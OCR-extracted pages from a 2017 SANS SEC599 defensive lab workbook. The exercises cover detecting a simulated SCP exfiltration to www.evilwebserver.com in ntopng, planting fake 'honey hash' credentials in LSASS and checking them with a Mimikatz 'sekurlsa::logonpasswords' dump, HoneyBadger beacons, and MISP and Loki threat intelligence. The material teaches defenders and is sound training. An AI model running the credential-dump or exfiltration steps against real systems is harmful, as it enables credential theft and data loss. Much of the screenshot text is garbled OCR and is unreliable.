Local Hosts Active Flows Matrix

,,, ,~.10 'l5 tt11".10.6 pfUfttt

1t1111.,e.11

11 t<rP S., .,, 1lOUI
'!' Top Hosts ilOUIJ 9 G,eoM1.9
a .!. TtNll.lP
C loutflollU,14.a,

c1-.:()1'--orv _,.,-.o..,~~,v--<11106Jil
IDt ma adfflilt ,IM'ld ~ bnt

0 ·~·
0

13. Scenario 3 - Exfiltrate data using SCP
Finally, we will now exfiltrate some information in encrypted fashion using SCP. We will open WinSCP (you can find it on t he desktop) and connect to www.evilwebserver.com .

© 2017 Erik Van Buggenhout & Stephen Sims

227

You should introduce the following details: o Host: www.evilwebserver.com
o Username: root o Password: sec599 Once the transfer window is opened, please configure the left window (local) to "Desktop". From the "Desktop", drag and drop the "exfil.7z" file to the remote window.

0..ttop · , ~...,·-com· W,nSCP

0

ioal Morlc ftl., l:ommonck S,,U.On Qpt,om fl<mote l:ldp

· 83 () S,,,,Chronar rJjl ~ " J:;i: 0.-t ·

Tr.Mftr Sdbngs De/tu~

liiii r-0-W-~tr-<om fi# N.., Session

ao..irtop

II] .. ·

~ rl! 're

,_

. (6 .
· ~ [I)

ijl Upio.d · .1 fd4 · 2~ dlrortory/boolmw1c
C . ' \ ~ 1Ctr1·01 Open ,p..:tf,td d.,.ctO<Y 0< ,....,c1 bookmark

t,_[""._;_~--. _ _ _ _ _ _ _ _ · X
,_J_ ro« _~ - - - Nomt

ELK
Ho<cknxnpu
lob
Mun,kou
... ~.,., .-. P1r.11"9tE<ca,.tJOn
Yi-- vutr..r-.bl< Soli,o.,re
yo,·
.....:i;;i.1.1,J
., tnfotm.ttan.btt ~ Mol1II, Thund,,twd.l.·
f.l OpenOffoce M.rh.ln~
~ Ope,Offoce Wntedn~
.p,fdh.txt
-/}putty.a· ~ VIWII Stu6oo Commu,.
I.W,nSCPD<
tu W1nSCP.,n·

10,mKB 1 KB 2KB 2KB 2KB 75KB
835KB 3KB
18,473 KB 14KB

Fol< fold« foltfoldet Flit foldtr Frltfold« F,lf foldtr Folc foldtr fllt folde, Fole lold,r F,le folder nFdt TotOocUmerrt Shoflcur Shortcut Shortcut Apphcauon Apf>li<obon Shortcut Appbuhon Conf,guraoon sffl

8/30/2017 2.01'33 PM 8/3/2017 t58:00AM 9/1Y2017 U2:12 PM &13./2017 ~ 1 AM 9/15/2017 6:S8:SS PM 7/lJl/2017 tS4.42 AM 8/312017 9'3X2 AM 9/IY2017 7·k:2· AM 8/2/2017 3.Sl,37 PM 9/IS/2017 6:S8:S1 PM 9"1S/2017 S<S3'U PM 7t27/1!J17 S<S3:19 PM 7/28/2017 t.SS;l3 AM 7n8/2017 S:SS:07AM 8/2/2017 3'48;47 PM 8/2Al2017 11-09-l0AM S/3/lfJl7 9:2&!19AM 8/24/2017 11:07,45 AM 9/TS/2017 6:52:36 PM

Oo<klop
Musoc P,ctura Pul>loc
v , _ TomplolK
exfil7t

10.SSSKB

(%J t;) ,t fS USi
Chtngtd 7128/2017 8:4S;38 AM 9 115/20171:21:14 PM 7/Z!/2017 9:03:16 AM 9/15(2017 1:21:!19 PM 7n1/20177-Sl:29PM 7/28120179:03:16 AM 7/28/20179:03-16 AM i/2&/2017 9'03:16 AM 7/2&120179:03:16 AM 7/211120179-<H:16 AM 9115/20176:58<51 PM

Fond F,1., [tJ ,,.
Rights rwrr--xr~x
.. rw,r·xr-,r
,.,,,,.,..,
t'WD·U·I rwx,-.r-a: ,WXl·XMC MXMU·K f'WJCl·lO'·l rwxt·Xf·l rwxf'·XM( l'W·r· · r· ·

14. Scenario 3 - Review settings in ntopng Finally, we will now refresh (FS) the matrix in ntopng and we should see a number of interesting items:
o There is a "new" host called "www" which is directly being talked to by 192.168.10.16 (unusual, as most traffic traverses the proxy/ pfSense);
o The volume is rather high compared to the usual traffic that was being generated.
Feel free to play around with some of the other views in ntopng and see whether you can detect other areas of interest.
The objective of this lab was to show you a few techniques you could investigate to detect data exfiltration. As already indicated in the course however, there is no silver bullet here... Furthermore, the rise of cloud-based services is making detection of data exfiltration on the network-level increasingly difficult!

228

© 2017 Erik Van Buggenhout & Stephen Sims

)(
C A Nol s«ure ~ 192.168.10 .1.JOO.. · "orts_matrn<.lua
N..,~, ) MISP CTF

8

D

· . Floo>· . . _ , _ . . O · & · Q - -

Local Hosts Active Flows Matrix
1"'1 ,sa.,o.,s

lt7 16&.l0.16

191168 10..&

b >-nawrl- \Y3 0 0\lo - . , f o , -

· pJoa,eUWl(le

192. 168, 10. 16 ·· WWYI

© 2017 Erik Van Buggenhout & Stephen Sims

229

This page intentionally left blank.

230

© 2017 Erik Van Buggenhout & Stephen Sims

SEC599-5.2: Exercise - Making your honeypot irresistibly sweet
Objective
The following are high-level exercise steps:
· Testing & analyzing the HoneyHash concept; · Implementing HoneyHashes in our environment using GPOs; · Configuring & testing HoneyBadger.
Scenario Virtual Machines
1. SEC599-C01 - Kali 2. SEC599-C01 - Firewall 3. SEC599-C01 - Windows 4. SEC599-C01 - DomainController 5. SEC599-C01 - Ubuntu0l
Exercise 1 : SEC599-5.2
Throughout this lab, we will introduce two interesting cyber deception techniques, both focused on t ricking the adversary in our network. First, we will introduce & implement the concept of a HoneyHash. Afterwards, we will deploy a HoneyBadger web site to track potential adversaries.
High-level exercise steps:
· Testing & analyzing the HoneyHash concept; · I mplementing HoneyHashes in our environment using GPOs; · Configuring & testing HoneyBadger.
1. Authenticate to Windows workstation As a first step, let's authenticate to our Windows workstation using the following credentials: o Username: nick.fury o Password: Awesomesauce123
2. Review New-HoneyHash.ps1 Right-click the "New-HoneyHash.psl" script that is stored on the Desktop and open it using "Edit with Notepad++". Should you receive a message about possible Notepad++ updates, please ignore this by clicking ""Cancel". The script is welldocumented and explains its purpose: it will inject a fake credential in the LSASS process, t hereby tricking Mimikatz users.
Take your time to read t hrough the script if you want to better understand what it's
© ?017 Frik \/;m R1innPnhn11t l?. StPnhPn Sim~

doing .. .

~ C:\ Uw,\n1cVu,y\0.sttop\N,w·Hor\<)+wSh psl · Notep,d··
E,,codir,g l · ~ · Sdt,ng, Tool, Muro ~"" 91"9'"' W,ncio,,
~ f'::,ca'it · t ::i~ "'.1 :J:

... . · · ·Ii:!

funot1on New--P.oneyHeah (

A.:..;. .. t-- : : H~~t"''"'V "'raebe: l~t.t1! r st.ae1onJ

t

L:Lcn.,· 830 J- 1au..tc

a.cq- 1.r-e~ De"e.::~:. 1es )I ne

-:,~...1c-al t-epe:~=-1e.,1 .nc

.Df!SCRinIOII

tJe.w-H e tl·sh 1.s · ·Ur:plie- Wt"illlJ.per t. :- ·dva;.:1,: e.e·tefrcc~:siisl:1.t · oo,:.W

tGllt ~p~ 1t1,.., 't...'°'~

N£T:.r:LDDIT1A.LS C)',;;_y ~··O· Niev-Kc-e· It'" V1ll

pr::!!Cit.

t r a ~~.s r; t-=.:.e· · t·ke-t:a?1$tir.r:1 ·t tae p;a~, rd ~r1llmJl:.

,

s;:~r1t.1"' t'".. ! .sic~ rt =.a.:.n

,2

23

· PARAMETER ~e..:.t:.ame

D X

,t

~ 1. r.\J.cr;i

3

(cadlet81nd.ul9 () I

3. Test New- HoneyHash.ps1 In order to test the "HoneyHash" technique, please open up an "elevated" powershell prompt by right-clicking the powershell icon in the taskbar and selecting "Run as Administrator". You can provide the following credentials: o Username: .\student-localadmin o Password: sec599 Within the Powershell prompt, please change to the following directory: o C:\Users\nick. fury\Desktop Once inside the Desktop, please run the following commands:

PS C:\users\nick.fury\Desktop> Import-Module .\New-HoneyHash.psl PS C:\users\nick.fury\Desktop> New-HoneyHash

Provide the following values: o Domain: SYNCTECHLABS o Username: svcadmin o Password: svcadmin2017
Upon successful completion, you should receive a message indicating the hash was successfully injected into LSASS.

232

© 2017 Erik Van Buggenhout & Stephen Sims

4. Confirm effectiveness using Mimikatz Let's now confirm the presence of our honey hash in LSASS. What better tool than Mimikatz to try extracting credentials from our very own LSASS :)
We can invoke Mimikatz as follows: o Right-click the command prompt icon, right-click "Command Prompt" and select "Run as Administrator" o Provide administrative credentials:
· Username: .\student-localadmin · Password: sec599 In the command prompt, please navigate to the following directory: o C: \users\nick.fury\Desktop\Mimikatz\x64\ Run the following command:
C:\users\nick.fury\Desktop\Mimikatz\x64\> mimikatz privilege: :debug sekurlsa::logonpasswords
This will generate a large output, which you will now have to carefully inspect. Somewhere inside the output you should find a hash for a user "svcadmin", which is the fake hash we just generated!

© 2017 Erik Van Buggenhout & Stephen Sims

233

5. Taking it a step further - GPO madness! Did someone say enterprise-wide honey hashes?! We've prepared a .bat script that can- be added as a "Startup" script to generate a honey token whenever a computer in the domain starts up.
Feel free to have a look, you can find the script here:
\ \DC\sysvol\synctechlabs.com\Honeytokens\plant.bat
You will notice we are planting a honeyhash for a fake user acount called
"backupadmin". If you are pondering implementing such a setup yourself, it's
probably a good idea to not call the folder "Honeytokens" :)
In order to implement the script, let's switch to our domain controller! Let's authenticate to the domain controller using the following credentials:
o Username: Administrator o Password: Sec599 In the Server Manager, click "Tools"-> "Group Policy Management". Within the Group Policy Management, drill down as follows: o Forest: synctechlabs.com o Domains o synctechlabs.com o Default Domain Policy (right-click-> "Edit...")

234

© 2017 Erik Van Buggenhout & Stephen Sims

_j Group Policy Management

..a File Action Vtt:iN Window Help

··

I )( ~ 6 rit

- - - -~

_j Group Policy Management Default Domain Polley v _A Forest synctechlabs.com Scope Details Sem,gs DeleglMfl

v Domains
v 1,i synctechlabs.com

links

· Default nnm~in Displayln<a n this locat,on.

> ,J Domai > .J Group  > - WMI Fi 
:;i Starter
> ~ Sites

E.dit... Enforced Link Enabled Save Report...

l OUs are Irked to ti-as GPO:
&ioroed Yes

·t ~ Group Policy I View

,.1, Group Policy f

New Window from Here

Delffe Rename Refresh

Hefp Add

Remove

<
Open the GPO editor

WNI Rltertng
ThsGPO ts Inked 10 the folo""'ll!I WMI r·er
>

D X
-----_ &
V

6. Browsing the startup scripts
Within the Group Policy Management Editor, we will now open the "Startup" scripts location, where we will add a .bat script we developed for the honey hashes. You can browse the structure in the following way:
o Computer Configuration
o Policies o Windows Settings o Scripts (Startup/Shutdown) Right-click "Startup" and select "Properties".

© 2017 Erik Van Buggenhout & Stephen Sims

235

Group Policy Management Edrtor F,le Action View Help

v }- Compute< Confi9ur1t1on

v

Policies

Startup

SoftwareSdbngs Dtspl.y e....,_;,"t!il.
v _ W,ndOW5 Settings

Name Resolubon Scnpts (Startup/S
> '!'Ill Deploy,d Pnnter > S«unty Settings
> j i Pohcy·basedQo'

Descnpt1on: Contains computer startup scnpts.

_ Adm1ntstr1trve Temp
..J Prderences

v 1 User Conf,gurallon

Pohc,es
> _. Preferences

Name

Help

·
I

<

> Extended Standird

Opens the properties dialog box for the current select,on.
-~~-.--------=======o=:o---======--

7. Add the startup script Within the Startup script window, click "Add..." and configure the script name as:

\ \ DC\sysvol\synctechlabs.com\ Honeytokens\plant.bat

Confirm the changes you made by clicking "OK" and "OK" again.

236

© 2017 Erik Van Buggenhout & Stephen Sims

--- - ~-----~

.)

· rtor

Filoe ActJort Vioew Help

...

u i L

~rt

J Od~

a,n Policy (DC.SYN

o. -!IS

v Computer Configuratiort

v Poli«l!S

Software Settings v Windows Settirtgs

Add ,Script

N,me Rl!SOlubort

_ Scnpts (Startup'S
> · Deployed Pnnter, > "' SecuntySettings
.at Policy-based Qo!

Adm1n1str.t,v,, Temp

Prderen<l!S
v ¥5. User Configurat ion
,-. Policies

)

Preferl!f'ICl!S

C X
? X I---------t
X

Show Fies .
OK
I\ < _ _ _ _ _ _ _> Extend~ / Standard /

8. Reboot Windows workstation
Now, let's switch back to our Windows workstation and reboot the machine.

9. Authenticate to workstation &amp; run Mimikatz Once the system has rebooted, please authenticate using t he following credentials: o Username: nick.fury o Password: Awesomesauce123 Once authenticated, launch an elevated command-prompt using the following credentials: o Username: .\ student-localadmin o Password: sec599 Within the command prompt, navigate to the following directory: o C: \Users\nick.fury\Desktop\Mimikatz\x64 Inside the folder, run Mimikatz again by specifying the following command

C:\Users\nick.fury\Desktop\Mimikatz\x64> mimikatz privilege::debug sekurlsa:: logonpasswords

As a result you will notice that an entry is listed in the output for the "backupadmin" account. As anyone using this account has stolen it from memory (or has been messing about in your GPO's), you can now treat any related activity as suspicious...

© 201 7 Erik Van Buggenhout & Stephen Sims

237

ii m,,.,,m,2.1.1,d;,t(ouo)

- DX

10. Introducing HoneyBadger Next up, we'd like to introduce HoneyBadger (by lanmaster53), which is a tool designed to keep track of visits to a "lure" web site. HoneyBadger is part of the ADHD project (Active Defense Harbinger Distribution). From it's official website:
ADHD is a Linux distro based on Ubuntu LTS. It comes with many tools aimed at active defense preinstalled and configured. The purpose of this distribution is to aid defenders by giving them tools to ''strike back" at the bad guys.
We have installed the base HoneyBadger files on one of our internal hosts. We'll now configure it and perform a short demonstration to see how we could possibly use it!
11. Open Putty session to 192.168.20.10 As a first step, we'll open a Putty session and connect to 192.168.20.10. You can find the Putty shortcut on the desktop. You can use the following details: o Host: 192.168.20.10 o Username: sec599 o Password: sec599
If you are presented with a security warning from Putty, you can safely ignore it and continue connecting to our system. Once the session is open, switch to the /home/sec599/honeybadger/server folder using the following command:
sec599@webmail"'$ cd /home/sec599/honeybadger/server

238

© 2017 Erik Van Buggenhout & Stephen Sims

e sec599@wcbma,1: ~/honeybadgcr/ servcr

D X

,....
12. Initialize HoneyBadger We will now init ialize HoneyBadger by running the following commands:
sec599@webmail: rv/ honeybadger/ server$ python
>>> import honeybadger > > > honeybadger.initdb("sec599","sec599") >>> quit()
sec599@webmail:~/honeybadger/server$ python honeybadger.py
Using the commands above, we've initialized the HoneyBadger database with username "sec599" and password "sec599". After this, we've launched the honeybadger web interface.

© 2017 Erik Van Buggenhout & Stephen Sims

239

13. Open HoneyBadger web interface
We will now open Google Chrome (shortcut is provided in the taskbar) and select the HoneyBadger bookmark that has been prepared (http://192.168.20.10:5000). You can authenticate using the credentials you've just created (sec599 - sec599).

Upon authentication, you will see a map overview with some sample data loaded.

· honey Badger

><

8

· ~

C <D Not secure 192.168.201~5

,g,

· l3 0 qs> - ·f·ew> I <.(' Cvdoo 5-loox (:J S.fflf"e$ · Ev,...i,~

IGbon> Nnws

~ e r · MISP

CTF

HoneyBadger

.· X ;
login

14. Clean out sample data

240

© 2017 Erik Van Buggenhout & Stephen Sims

Inside the HoneyBadger web interface, click the "targets" button. You will notice that 1 "demo" target has been created (with 2 sample beacons), which we will delete using the "Delete" button.

)(

~

C <D 192.168.20.10 ~()(l('/13,g,,t

ce Mens, fnw· '(" Cud100 Sondbo, Cl SI

Hone} Badger

192168.20.10:5000 says:

I OK

e

· X

*
>< CTI'
1ap I profile targets beacons I logout

Canc,I

Id 1

name demo

9u1d aedc4c63-8d13-4a2Z-81C5·d52d32293867

beacon_count 2

- -action

15. Add our own target We will now create our own target "synctechlabs" (or you can opt to select another name). Upon completion, please click the "demo" button.

C (i) 192.168.20.10 I() !d g t
Hone1 Badger

targe: name

8

· X

-

· MISP

CTf

* :

adm1n map I profile targets beacon~ logout

id

name ~ynctechlabs

gutd Jd215Cd0·9029·4~·9a96-78eb1d5Iecge

beacon.count 0

- -action

16. Accessing demo page Once you click "Demo", you will be redirected to a "Demo" page that includes the "tracking" functionality. This is just a demo, empty, page which you would of course further adapt/ refine in a real environment (e.g. add some interesting information).
Note that even if you click "Cancel" in the JavaScript pop-up, the beacon will still correctly report.

© 2017 Erik Van Buggenhout & Stephen Sims

241

8 " C 11or.q,Badg..-O.mo X

X (!) 192.168.20.10,1 ,

(I

192.168.20.10:5000 says:

" CTF

Honey Badger demo By c dcin,g QI(· 'J!;;U consfflt to code ~1ng r.,.. Of\ your mKhi.nr for the porposr of9N)loQ1,ng '104/.f pm.t:!on

OK

c.,,.:e

D X
* :

17. Review beacons
After the demo page is loaded, we will now access the "beacons" function (top right of the HoneyBadger main screen). Inside the beacons screen, you'll notice that our IP address (192.168.10.16) is reported, together with GPS coordinates.

The GPS coordinates are "placeholder" values, as the IP that is being detected is an internal IP address, which doesn't yield good results in a GeoIP lookup.

This completes our exercise, where we've attempted to provide you with two interesting ideas to set up honeytokens in your environment!

X
C <D 192.168.20.10 ,

~·cor

Honey Badger

8

D X

* :

adm,n I map profile targets beacons logout

target

agent

I.al

lng

ace

,p

tune

action

synctechlab~ HTML .:21393 ·758798 Unknown 1921681016 2017·09-16 222320 -

242

© 2017 Erik Van Buggenhout & Stephen Sims

SEC599-5.3: Exercise - Leveraging threat intelligence with MISP & Loki
Objective
High-level exercise steps:

· Get acquainted with the MISP interface · Adding an event & attributes in MISP · Exporting YARA rules from MISP · Running Loki using the exported YARA rules
Scenario Virtual Machines
1. SEC599-C01 - Firewall 2. SEC599-C01 - DomainController 3. SEC599-C01 - Ubuntu04 4. SEC599-C01 - Windows
Exercise 1 : SECS99-5.3
The objective of the lab is to leverage threat intelligence that is available in MISP. We will perform a small walkthrough of the MISP interface, after which we will download some YARA rules and use them as input for the Loki APT scanner!

High-level exercise steps:
· Get acquainted with the MISP interface · Adding an event & attributes in MISP · Exporting YARA rules from MISP · Running Loki using the exported YARA rules

1. Authenticate to Windows workstation As a first step, let's authenticate to our Windows workstation using the following credentials:
o Username: nick.fury o Password: Awesomesauce123

2. Open MISP web interface
We will use the MISP (Malware Information Sharing Platform) for the purposes of exchanging threat intelligence. From its official web site:

A platform for sharing, storing and correlating Indicators of Compromises of targeted attacks. Discover how MISP is used today in multiple organisations. Not

© 2017 Erik Van Buggenhout & Stephen Sims

243

,.
only to store, share, collaborate on malware, but also to use the roes to detect and prevent attacks.

We have set up a MISP instance inside our lab environment, which is preloaded with a number of open source intelligence feeds. Let's explore the interface by opening Google Chrome and browsing the MISP bookmark. Ignore the self-signed certificate error and use the following credentials:
o Username: nick.fury@synctechlabs.com
o Password: Awesomesauce123

· U,...·MISP

X

~

C A Not secure l>l('Jls 192.1&8.30.17

8

· X

Threat Sharing
Login

Email nick rury@synctech1aos com
Ill

Password

3. Exploring the MISP interface - Events Once authenticated, the first page you see in MISP is the "Events" page. Note that you may need to zoom out a little bit in Chrome, as the "Events" page has a lot of information.
An "Event" in MISP can be compared to an attack campaign for which roes exist. In the "Events" view, you will notice the following fields per event:
o The organization that created the event; o The event id;
o If available, contextual information such as Threat Actor or Tools; o Tags, which could include for example the source of the event or the TLP
(Traffic Light Protocol) classification for the event; o The number of attributes (an attribute is typically an actual IOC); o The date the event was added;

244

© 2017 Erik Van Buggenhout & Stephen Sims

o The name of the event; o The distribution settings for the event;
0
You can click on the event id, which will open that event (and all linked attributes).

8

D X

* 0.

~
~:=-
wa - ~ -

EQ,ents

I ~- .._

°"

0--0Q

I .,

·

· ~ Q

----

...,._

-- -""!!.,! ,. ,·,, ;;;;;-;::1-;;;.1

" , , a, ,.a;;cM !'~

QI _ . , ~ _ . . »170IZ'l 1-

. ·

"'

Q

.,

~ , ......

Q

_..,..,,..a----at0:·4'-

· - -J

t'l7 ......_..

1 111 + :;;;;:-

C: ll · iN : 4&14i

I _,. MlllJl'II \.._

----_-_--_---_-_- - - ............
r-.--, .o.u..n....._..La

~r~..1
M

--------·-.-.........

C.......C81M'C-

·

·---- C-..-~\alr

M

4. Exploring the MISP interface - Attributes
Once you open an event (by clicking its event ID), you will receive a detailed view of the event. In our example, we've opened event ID 160, which is part of a Locky ransomware campaign.

When scrolling down, you will also see all attributes linked to this event. Attributes are usually "IOCs" that we can use to perform active hunting or incident response! Typical example categories include:
o Hostnames o I P addresses o File hashes o Tools o YARA rules o IDS rules
0

© 2017 Erik Van Buggenhout & Stephen Sims

245

C A Notsecur· ~ 192.168.30.17 . ··· ,,/16-0

8

D X

..... Ui£;""'"'1'
.-
--.........._
----- ~ ·---
----..
._.....,._..,..

M2M - Locky 2017-09-06: Affld=3: "Voice Message from...

I ~~
o.-.,.

. .,
~...en-~·41:~,~:'.".~;·c, a,,c_

Refa~ evenis

,..,,

·.1,,';yO-)f"'CWJ"tat.·~
~it.J·U--'t! ' 3·'1¥ .: 3sl: · fr'fWID

....

°'9<··
J J ~.._...

..,~ - ~~t·,:t...'°t >~1 'Vi>c·¥tJU2t'rl)r":-1t;J·M:·~ · ~J... . ·l·J.40:· l"'!Hla,t-,.

Mii'IM i''lt§f § j

_J

5. Exploring the MISP interface - Search Attributes Imagine you've identified a hostname, file hash,... during one of your investigations and you'd like to see if there's any related information in MISP... You can achieve this by clicking the "Event Actions"-> "Search Attributes". Just to illustrate the search function, let's try searching for the following domain name:
"halley-informatica.com"
You can enter the value in the "Containing the following expressions" field.
This should render a few results, which you can further investigate.

246

© 2017 Erik Van Buggenhout & Stephen Sims

C A Not secure ~ 192.1 68.30. 17,4rtnbutes/se re~

Attributes Resuha for all auributeo with the value containing "halley.Jntormatica.c:om·:

--t----~

£....-T °'9
DC ·

U4)

·

~ ·

( ~ ~ \.,.....
,....,...ct~ o-ct« :,::wue,~..,.
,~~~~U/11\

,.r.w.Yc.aa:-r., 1-1

t ~ !'-f~t(ct-;""+1U.".'ti l'lt/"lt

--

8

· X

* 0,

"' ..,_
'< ctl m
,., GI II

Vu

Gl[I

6. Exploring the MISP Interface - Adding Events Throughout your investigations & research, at some point you will most likely
identify some interesting malware-related information! It's a good idea to add this information as events / attributes in MISP. Even if it's sensitive information, you can centralize it in your own MISP instance and choose not to share it with other communities.
It can then be used in an automated fashion to feed your detection technology (e.g. SIEM, EDR tools,...). You can add information in MISP by clicking: "Event
Actions" -> "Add Event".
o In this first screen, you need to provide some initial information about the event:
· What is the date?
· What is the threat level?
· Who do you want to distribute the event (& its attributes) to?
· What is the analysis stage?
· A quick event description

© 2017 Erik Van Buggenhout & Stephen Sims

247

4' Ev,n,s · MISP

><

C A Nor secure ~ 192.168.30.17

8

D X

Q *

The event oealed will be cestrtcled to the 0<ganisat1011s mclufle<l ,n the a,stnbullon setllng on the local u1s1ance oniv unlll 11 ,s publlsl1t,d

Add Event

Date 2017-09 16 Threat Le-,et O Hi~
faemlnfo SEC599 · Tes1 'lVent GA sandbox Chooa FIie No file chosen
Ill

°'51ribubon 0 Thli,c~oo/1

7. Exploring the MISP interface - Adding attributes Once you clicked the "Add" button in the "Add Event" screen, you will now land in the detailed event screen. On the left-hand side (in the menu), you can now select a number of options:
o "Add Attribute" (to add attributes one by one)
o "Populate from" will allow you to add a set of attributes from an external source (e.g. an OpenIOC file)
0
We will select "Add Attribute" and add the following type of attribute (remember the exercise we did yesterday, when we developed an IDS rule for certutil.exe):
o Category: "Network actvitiy"
o Type: "user-agent"
o Value: "certutil.exe"
o Contextual comment:"Built-in Microsoft tool abused to download additional payloads"

248

© 2017 Erik Van Buggenhout & Stephen Sims

~ttribulu · MISP

X

~

C A Notsewre ~ 1~2.168.30,17 ,tt,t,,~"'·dd,8

X D ~ PIS<tm· F -

Cuckoo Sandbo>

Sampl« · Ev,w,e!,s, I) l<lb·n·

N<!>M D Ho,,eyBadger 't 1,1159

8

0 X

---- ~ *
CTF

'w1iltw-('Jtnl
"""~(if....
~ f · - tt..,k:11",

Add Attribute Ca:egory O
N&IWOII, actMty Dislribulion 0
Value

Type O

to, lntNSlon Detection ~stem
BIii

Batdl 1.-.,ort

8. Exploring the MISP interface - Servers &amp; Feeds So... We've created an event and added an attribute!
The main idea behind MISP is of course the sharing of threat information! Under the "Sync Actions" menu, you'll notice two options for this:
o List Servers o List Feeds "Servers" are other MISP instances to which you are connected. You can see this as a sort of "trusted" P2P network with other parties with whom you'd like to share information. It's important to note that you can use fine-grained authorization levels to determine what information is shared with whom.
"Feeds" are third-party feeds that are loaded in your local MISP instance. The events & attributes you've just looked at are part of a number of open source threat intelligence feeds that have been loaded in MISP by default!
Let's click the "List Feeds" button and have a quick look at the different sources!

© 2017 Erik Van Buggenhout & Stephen Sims

249

W F,<d, · MISP

x

t-

C A Notse<:ur~ ~ 192.168.30.17 ·~

,no.,-

0

· X

Generate feoo lookup caches

,.., l tRCl.~o'"'fM!l - ,.,·SF C.iR'.GI.

T'·..tot~ .... r:~- -

·-'-'"IF

£,,,.,, ...

0 ~of

-~ .....,...,....~,.IL

...... l'!M,t 11PTW;·~""' C$V

- ...

N!fMll\, ,cot n .,t"IO.&' t :~a:.-"I~ )!9t"f"
~""~
~ ~ u ...adlra.--. 1· ~':.0e· ~oJ>-o·
4Qoir·&;,:·~J

.. ..... .,,, .,,,

~ , ~ ..itl.r.wvn;r:-..m ~ ~~.MDo ··- X

!Ct011

'!lNd

-, .,

...,,., tr:t:CG ~

-

Ol'p"1"W)Orl

,.... ~

.~ .... ~

,.... r;t;;
~ ,.., ~

9. Exploring the MISP interface - Export IOCs
So... How do we USE this information that is inside MISP? There's a few options to achieve this:
o Some tools support direct interaction with the MISP API to load intelligence (using an authorization key).
o MISP also has an "export" function available to export attributes, so they
can be loaded in third-party tools. You can click the "Event Actions" ->
"Export" button, where you will see that a wide variety of export formats is supported (including Suricata, Snort, JSON, XML,...)
Although Loki has a python script to fetch information from MISP automatically, it's not always that reliable. We will thus download all YARA rules in our MISP instance using the following URL:
https://192.168.30.17/attributes/text/download/yara
This is one of many different API calls that can be configured in automated systems to fetch informat ion. Please note that they will need to add the HTTP Authorization header (which is currently being done for us by our browser).

250

© 2017 Erik Van Buggenhout & Stephen Sims

Ewnts · MiSP

)(

~

C D · ·ps: 192.168.30.17/,.tt< D t ' ·,A d-,wn,oad·y« ·

e

· X

-~
......

lmilOlt r,om MJSP e.,oo,1
la!A:lt:>u!OS

t- AlltornatlOO iunccooalol)· is d..·oneo to automaliCSlty oenetate Slj1natures fo< ,mrvs,on detedlon sv~,,,. To enable s,onaluffl gene,at,on ror agl>'on

attrill<Jte Sl9,nalllre ftetd of 1/liS atlflt<Jte must De set to Yn Note tnat not al al!nl>Ule

are IDl)llcable for Signature generauon. current/,' we on11

·llffll· suPQOlt NIDS ·>Gnatur· 9......:-on fot IP domms l>c»l names use,

etc. and h8S111151 gene,atlon fo< MOS1SHA1 values ol l<e art.fads

.,-

s ~ -..

SuP!)Oll lor mote anrrt>ulll l'/l>OS 1, p:anned To to make w,,s lunci,onatay avaolaOle for au,0111ateo too,s an arJll\enf>cabOn ··Y ,; u.ed Tho makes d

ea~1et ,a, ~our toots to access tne data wdtloutfurthet' forrn-baseo-autJ\eneau0n.

Make sure you keep rtiat key secret aa It gives occeu to tbe enUrf databa.s& !

\lteW Prq,osa1$

,,.....

Ewnt,WID\1)1000!'31!:

Sonct _...., 2.2 toe "'"9t of th· ~ koy ., U>e urt ,. c1ec><eca1ed Instead pass me aum Kev 111 an Au:nottzot<On ,,.....,., u,e roQUu l

°"'Ion The leoacy

01 Ila.mg 111t 111111 kt)' In tl\e un Is 1emc,oran1y ·!JI ~ l!UI not retommenoe<I.

P1ease " " 111· ..., !he fOlt<>.-An!I nea<tet
A.JthOr'latiol'l; %.]irfAB-:>dTi..f"kl.O~F62brXaYqOl'(.IC7yjltc

XML Export

10. Moving misp.yara.txt to Loki Let's now move the extracted YARA rules file (misp.yara.txt) to the Loki folder, so it gets parsed during Loki's scanning activities. You can find the downloaded file here:
C:\Users\nick.fury\Downloads\misp.yara.txt
The folder we want to move it to us:
C: \Users\n ick.f u ry\Desktop\Loki\signature-base\yara
We will also rename the file to "misp.yar", so it will be in line with the other YARA rule-files already present.

© 2017 Erik Van Buggenhout & Stephen Sims

251

· y1111

Sha1c V1tw

~

- 1"

> This PC Desktop ~ Loki > s,gnature-b·~

,..

it Quick 1ccess

· Desktop

'JI

-,I, Downloads 'JI

m3ed.S362115bdaef4912.ym
.. m3ef.099d6a-49c0000b12.yar, m3f411584972d882fb12.y111

.. ,, Docummts 1' P1ctu1es Honeytokens Lola
I Mus,c
Pnvtlege Escalation
,a. Ond>rrve
c;;1 This PC

m3f'.l.6d14de~12.y,r1 m3fa.4b9916185bab6376.yara m3fa.11314c6eca634932..y11a ml\p.yar n3e9.1ba1200040000132..yari n3e9.2.llb21~39cSb6b92.yara n3e9.lb l2S7a0dda30912.yara
. n3e92b16S7a0dd1130912.yara n3e9 2b92S7a0dda30912.ye111 n3e9.2b9297a0dda30912.yara

dtN~ork

n3e9.4b989099c2200b 12.yara n3e9.05bS29b9c&210b32.yar1

n3e9.06b6ccc 184000954.y ua

n3e9.6c18dbb8c8BOOb32.yara n3e9.6cad84b8c9bed131.yar1

n3e9.16c3392912d311~y,ra

n3e9.26b2ccc l840009S4.y1r1

n3e9.31cbbS29c8000932.yar1

1,2µnems

nl.O (\dQ,tQ.,.,-1,AtVVlQl) v ar·
I ,tern selected 1~2 liB

)1111

.., C, Su1chura

Date modified

Type

9110/201710:16 PM VARA FIi·

9 16/2017 10:16 PM YARA F1lc

9 1b .?OP 1"-1t PM VARA f1 c

9 16/2017 '0:16 ~M Vt.RAF, c

9116/201710:16 PM YAP.A File 9 16,,201-10:16PM v:.RA F ,

9 16(201710:29 PM VAR File 9 16/201, 10:16 PM ,:.i:::. F,lc

9,·£,,12017 10:16 PM YARA file

9 1612017 10:16 PM YAP.A Ftlc

9 161201- 10:1~ PM YAP.A F,le

9 16!2017 lC:16 Pt 1 YARA FM

9 16.':>017 10:16 PM 't'AR:. F,1,

9 16/201i 10:16 Pf.I VARA File

9/16/2017 10:16 Pl,' Y..\P.A FIie

9 1612017 10:16 PM ~:.RA Falt

9 lof2017 10:16 PM Y/..P.A FIie

9/16/2017 10:lo PM YARA File

9 16/20r 10:16 PM YARA FIie

9 16/201- 10:16 PM YARAFtlc

9/16/2017 1~16 PM \ARA Filr

C II; ,n1~ 1~1' PL' VA':'/J f,.,.

D X
0

S.!c

"

I KB

I KB

U.B

1 KB
ns

1 KB

llHll

I KE

I KS

l KS

1KE
1 r.s

IKB

l KB

1 KB

11.B

1KB
n·e

l K2

11:B

I KB ..,
l ¢.

